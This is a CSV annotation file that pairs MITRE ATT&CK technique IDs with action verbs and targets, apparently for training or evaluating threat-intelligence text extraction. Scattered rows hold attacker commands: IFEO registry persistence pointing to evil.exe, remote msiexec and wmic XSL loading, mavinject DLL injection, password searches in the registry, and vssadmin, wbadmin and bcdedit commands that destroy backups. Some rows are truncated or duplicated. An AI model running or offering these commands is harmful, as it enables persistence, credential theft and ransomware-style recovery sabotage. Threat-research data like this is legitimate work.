id,what,where
t1179,modify,IAT pointers to CreateWindowEx
t1179,inject,program
t1179,spawn,system thread
t1179,overwrite,first byte of API function
t1179,modify,process IAT
t1179,use,hokking procedure
t1180,modify,HKCU\Control Panel\Desktop\scrnsave.exe
t1180,modify,HKCU\Control Panel\Desktop\screensaveactive
t1180,modify,HKCU\Control Panel\Desktop\screensaverissecure
t1180,modify,HKCU\Control Panel\Desktop\screensavertimeout
t1181,write code,EWM
t1181,write code,Extra Window Memory
t1181,write payload,EWM
t1181,write payload,Extra Window Memory
t1181,place pointer,EWM
t1181,place pointer,Extra Window Memory
t1182,use,application programming interface  api  functions /createprocess/createprocessasuser/ createprocesswithloginw/createprocesswithtokenw/winexec/
t1182,use,HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager
t1183,,reg add hklm\software\microsoft\windows nt\currentversion\image file execution options\notepad.exe
t1183,,v globalflag
t1183,,t reg_dword
t1183,,d 512reg add hklm\software\microsoft\windows nt\currentversion\silentprocessexit\notepad.exe
t1183,,v reportingmode
t1183,,t reg_dword
t1183,,d 1reg add hklm\software\microsoft\windows nt\currentversion\silentprocessexit\notepad.exe
t1183,,v monitorprocess
t1183,,d c:\temp\evil.exe causing a malicious executable to be loaded and run
t1183,register,malicious debugger
t1184,compromise,ssh agent
t1184,use,agent socket
t1185,use,security vulnerability
t1185,use,browser functionality
t1185,set,http proxy
t1186,use,legitimate executable
t1186,use,TxF transaction
t1186,use,Windows Transactional NTFS
t1186,use,Process Doppelganging
t1187,point,external reference
t1187,force,smb authentication
t1187,force,smb authentication
t1187,use,template injection
t1187,use,spearphishing
t1187,use,file[:]
t1187,use,
t1187,use,[remote address]
t1187,use,normal.dotm
t1188,use,several proxy
t1188,use,tor
t1189,use,JavaScript
t1189,use,iFrames
t1189,use,cross site scripting
t1189,use,Built in web application interface
t1189,use,JavaScript
t1189,use,iFrames
t1189,use,cross site scripting
t1189,use,Built in web application interface
t1189,use,JavaScript
t1189,use,iFrames
t1189,use,cross site scripting
t1189,use,Built in web application interface
t1189,use,JavaScript
t1189,use,iFrames
t1189,use,cross site scripting
t1189,use,Built in web application interface
t1190,use,software
t1190,use,data
t1190,use,command
t1190,use,databases
t1190,use,sql
t1190,use,standard services
t1190,use,smb
t1190,use,ssh
t1190,use,web servers
t1191,infect inf file,malicious command
t1192,accompany,link with social engineering text
t1192,attach,link with social engineering text
t1192,use,browser exploit
t1192,accompany,link with social engineering text
t1192,attach,link with social engineering text
t1192,accompany,link with social engineering text
t1192,attach,link with social engineering text
t1193,use,Microsoft Office document
t1193,use,executable
t1193,use,PDF
t1193,use,archived file
t1193,use,Microsoft Office document
t1193,use,executable
t1193,use,PDF
t1193,use,archived file
t1193,use,Microsoft Office document
t1193,use,executable
t1193,use,PDF
t1193,use,archived file
t1194,ask about,job opportunity/service
t1194,ask about,policy/ software
t1194,leverage,user execution
t1194,leverage,socail media
t1194,leverage,social media services
t1194,leverage,personal webmail
t1194,leverage,non enterprise controlled service
t1195,,
t1195,,
t1195,,code
t1195,,
t1195,,image
t1195,,selling s
t1195,,w
t1195,use,open source code
t1196,use,Spearphishing Attachment
t1196,use,command line
t1196,use,programmatically
t1196,use,application programming interface  API  call
t1196,double click,double click the file
t1197,create,long standing job
t1197,invoke,program when a job complete or error
t1198,modify,dll  registry value
t1198,modify,FuncName registry value
t1198,modify,HKLM\SOFTWARE[\WOW6432Node]Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllGetSignedDataMsg{{SIP_GUID}} to the DLL providing SIP?s CryptSIPDllGetSignedDataMsg function
t1198,modify,HKLM\SOFTWARE[WOW6432Node]Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData{{SIP_GUID}} to the DLL providing a SIP?s CryptSIPDllVerifyIndirectData function
t1198,modify,HKLM\SOFTWARE[WOW6432Node]Microsoft\Cryptography\Providers\Trust\FinalPolicy{{trust provider GUID}} the DLL providing a trust provider?s FinalPolicy function
t1198,point,malicious dll
t1199,use,trusted third party relationship
t1199,use,valid account
t1200,,
t1201,use,net accounts
t1201,use,net accounts /domain
t1201,use,chage  l
t1201,use,cat /etc/pam.d/common password
t1201,use,pwpolicy getaccountpolicies
t1202,use,Forfiles
t1202,use,the Program Compatibility Assistant  pcalua.exe
t1202,use,components of the Windows Subsystem for Linux  WSL
t1202,use,Run window
t1202,use,scripts
t1203,use,Drive by Compromise technique
t1203,use,Spearphishing Link technique
t1203,use,Spearphishing Attachment technique
t1203,use,Spearphishing Link technique
t1203,use,Spearphishing via Service  technique
t1204,deliver,Spearphishing Attachment technique
t1204,deliver,Spearphishing Link technique
t1204,use,Spearphishing Attachment technique
t1204,use,Spearphishing Link technique
t1205,send,series of packet
t1205,use,libcap libraries
t1206,disable,tty_tickets
t1207,register,rouge DC
t1207,create,new server and nTDSDSA object
t1207,alter,replication
t1207,alter,associated metadata
t1207,delete,replication
t1207,delete,associated metadata
t1207,manipulate,AD object
t1207,manipulate,account
t1207,manipulate,access control list
t1207,manipulate,schema
t1208,perform,brute force technique
t1208,perform,valid account technique
t1209,use,time provider registry key
t1209,use,HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\W32Time\TimeProviders\
t1210,take advantage,error
t1211,reconnaissance,vulnerability
t1211,reconnaissance,security software discovery technique
t1212,,
t1212,,
t1212,,
t1213,,
t1214,use,reg utility
t1214,use,"reg query hklm /f password /t reg_sz /s,reg query hkcu /f password /t reg_sz /s"
t1215,,
t1216,,cscript C[:]\Windows\System32\Printing_Admin_Scripts\en US\pubprn[.]vbs 127.0.0.1 script:http[:]
t1216,,
t1216,,192.168.1.100
t1216,,hi.png
t1217,,
t1218,,msiexec.exe /q /i c:\path\to\file.msi
t1218,,msiexec.exe /q /i http[:]//site[.]com/file.msi
t1218,,msiexec.exe /y c:\path\to\file.dll
t1218,,c:\program files\common files\microsoft shared\clicktorun\mavinject32.exe <pid> /injectrunning <path dll>
t1218,,c:\windows\system32\mavinject.exe <pid> /injectrunning <path dll>
t1218,,
t1218,,regsvr option
t1218,,odbcconf.exe /s /a {regsvr c:\users\public\file.dll}
t1219,use,desktop support software
t1219,use,remote access software
t1219,use,remote access tool
t1219,use,team viewer
t1219,use,go2assit
t1219,use,logmein
t1219,use,ammyyadmin
t1220,use,msxsl.exe/wmi/windows management instrumentation
t1220,use,msxsl.exe customers[.]xml script[.]xsl
t1220,use,msxsl.exe script[.]xsl script[.]xsl
t1220,use,msxsl.exe script[.]jpeg script[.]jpeg
t1220,use,wmic process list /FORMAT:evil[.]xsl
t1220,use,"wmic os get /FORMAT:""https[:]//example[.]com/evil[.]xsl"""
t1221,using,template injection
t1222,change,specific access right
t1223,deliver,custom CHM file containing embedded payload
t1223,use,user execution technique
t1480,use,environment specific value
t1480,use,target specific value
t1480,use,network share names
t1480,use,attached physical devices
t1480,use,filename
t1480,use,joined Active Directory  AD  domains
t1480,use,""" local"
t1480,use,"external IP addresse"""
t1480,use,physical device
t1480,use,""" software"
t1480,use,"software version"""
t1480,use,system time
t1481,post,dead drop resolver
t1482,use,dsenumeratedomaintrusts   win32 api call
t1482,use,.net methods
t1482,use,ldap
t1482,,
t1483,concatenate,words together
t1483,incorporate,seed value
t1483,generate,different domain
t1484,use,New GPOImmediateTask script
t1484,use,SeEnableDelegationPrivilege
t1484,modify,"""<GPO_PATH>\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml"""
t1484,set,<GPO_PATH>\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf
T1485,use,command line argument
T1485,use,del
T1485,use,rm
T1486,withhold,decryption key
T1487,overwrite,critical data
T1488,use,third part tool
T1488,use,RawDisk
T1489,,
T1490,use,native windows utility
T1490,use,native windows utility
T1490,use,vssadmin.exe
T1490,use,"""vssadmin.exe delete shadows"
T1490,use,all
T1490,use,"quiet"""
T1490,use,wbadmin.exe
T1490,use,"""wbadmin.exe delete catalog  quiet"""
T1490,use,bcdedit.exe
T1490,use,"""bcdedit.exe"
T1490,use,set {{default}} bootstatuspolicy ignoreallfailures & bcdedit
T1490,use,"set {{default}} recoveryenabled no"""
T1490,use,WMI
T1490,use,"""wmic shadowcopy delete"""
T1491,,
T1492,,
T1493,intercept,data over connection
T1493,intercept,data between process
T1494,alter,application binary
T1495,overwrite,non volatile
T1496,use,recource hijecking
t1497,use,"""WMI query $q = ""Select * from Win32_Fan"" Get WmiObject  Query $q""/information learnt on automated discovery technique/Security Software Discovery technique/Windows Management Instrumentation technique/PowerShell technique/Systeminfo technique/the Query Registry  technique/scripting technique/sleep/timer/loop/ Win32 DeviceIOControl function/special I/O port to send commands and receive output"
t1497,use,"memory/ process/ file system/the Registry/drive size/user activity/browser history/cache/bookmark/number of files in the home directories/speed of mouse click/ frequency of mouse click/fan/temperature/CPU check/security monitoring tool/Sysinternals/Wireshark/""HKLM\SOFTWARE\Oracle\VirtualBox Guest Additions""/
""HKLM\HARDWARE\Description\System\""SystemBiosVersion"""
t1497,use,"""VMWARE""""/
""HKLM\HARDWARE\ACPI\DSDT\BOX_""""/
""WINDOWS\system32\drivers\vmmouse.sys""/
""WINDOWS\system32\vboxhook.dll""/
""Windows\system32\vboxdisp.dll"""
t1497,use,service/nstalled program/manufacturer field/product field/VME specific hardware instruction/VME specific processor instruction
t1497,check/search,"""WMI query $q = ""Select * from Win32_Fan"" Get WmiObject  Query $q""/information learnt on automated discovery technique/Security Software Discovery technique/Windows Management Instrumentation technique/PowerShell technique/Systeminfo technique/the Query Registry  technique/scripting technique/sleep/timer/loop/ Win32 DeviceIOControl function/special I/O port to send commands and receive output"
t1497,check/search,"memory/ process/ file system/the Registry/drive size/user activity/browser history/cache/bookmark/number of files in the home directories/speed of mouse click/ frequency of mouse click/fan/temperature/CPU check/security monitoring tool/Sysinternals/Wireshark/""HKLM\SOFTWARE\Oracle\VirtualBox Guest Additions""/
""HKLM\HARDWARE\Description\System\""SystemBiosVersion"""
t1497,check/search,"""VMWARE""""/
""HKLM\HARDWARE\ACPI\DSDT\BOX_""""/
""WINDOWS\system32\drivers\vmmouse.sys""/
""WINDOWS\system32\vboxhook.dll""/
""Windows\system32\vboxdisp.dll"""
t1497,check/search,service/nstalled program/manufacturer field/product field/VME specific hardware instruction/VME specific processor instruction
t1497,enumerate,"""WMI query $q = ""Select * from Win32_Fan"" Get WmiObject  Query $q""/information learnt on automated discovery technique/Security Software Discovery technique/Windows Management Instrumentation technique/PowerShell technique/Systeminfo technique/the Query Registry  technique/scripting technique/sleep/timer/loop/ Win32 DeviceIOControl function/special I/O port to send commands and receive output"
t1497,enumerate,"memory/ process/ file system/the Registry/drive size/user activity/browser history/cache/bookmark/number of files in the home directories/speed of mouse click/ frequency of mouse click/fan/temperature/CPU check/security monitoring tool/Sysinternals/Wireshark/""HKLM\SOFTWARE\Oracle\VirtualBox Guest Additions""/
""HKLM\HARDWARE\Description\System\""SystemBiosVersion"""
t1497,enumerate,"""VMWARE""""/
""HKLM\HARDWARE\ACPI\DSDT\BOX_""""/
""WINDOWS\system32\drivers\vmmouse.sys""/
""WINDOWS\system32\vboxhook.dll""/
""Windows\system32\vboxdisp.dll"""
t1497,enumerate,service/nstalled program/manufacturer field/product field/VME specific hardware instruction/VME specific processor instruction
T1498,use,botnet
T1498,use,direct network flood
T1498,use,reflection amplification
T1498,use,UDP
T1498,use,ICMP
T1498,use,DNS
T1498,use,NTP
T1498,use,memcache protocol
T1499,exploit,vulnerability
T1499,use,"""SSL"
T1499,use,TLS protocol
T1499,use,botnet
T1499,use,OS Exhaustion Flood
T1499,use,SYN Flood
T1499,use,ACK Flood
T1499,use,Service Exhaustion Flood
T1499,use,Simple HTTP Flood
T1499,use,SSL Renegotiation Attack
T1499,use,Application Exhaustion Flood
T1499,use,Application Exploitation
T1499,use,System Exploitation
t1500,use,csc.exe
t1500,use,gcc
t1500,use,mingw
t1500,use,Spearphishing Attachment technique
t1501,,create
t1501,,modify
